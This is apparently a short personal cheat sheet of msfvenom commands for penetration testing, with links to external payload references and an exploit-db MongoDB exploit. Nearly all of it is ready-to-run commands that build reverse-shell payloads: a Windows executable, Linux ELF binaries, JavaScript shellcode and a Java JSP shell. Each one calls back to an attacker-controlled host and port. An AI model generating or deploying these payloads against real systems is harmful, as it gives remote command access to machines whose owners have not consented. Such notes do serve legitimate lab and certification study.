Find payloads:
<https://burmat.gitbook.io/security/hacking/msfvenom-cheetsheet>
```
msfvenom -l payloads | grep -i windows
msfvenom -l payloads | grep -i linux
msfvenom -l payloads | grep -i java
```
## Classic shells:
<https://github.com/frizb/MSF-Venom-Cheatsheet>

Windows:
```
msfvenom -p windows/x64/shell_reverse_tcp -a x64 --platform windows LHOST=eth0 LPORT=443 -f exe > shell.exe
```

Linux:
```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f elf -o scp
```

javascript revshell with generic none: (worked well with this MongoDB 2.2.3 exploit: <https://www.exploit-db.com/exploits/24947>)
```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.119.198 LPORT=443 CMD=/bin/bash -f js_le -e generic/none
```

java revshell:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.199 LPORT=443 -f raw > shell.jsp
```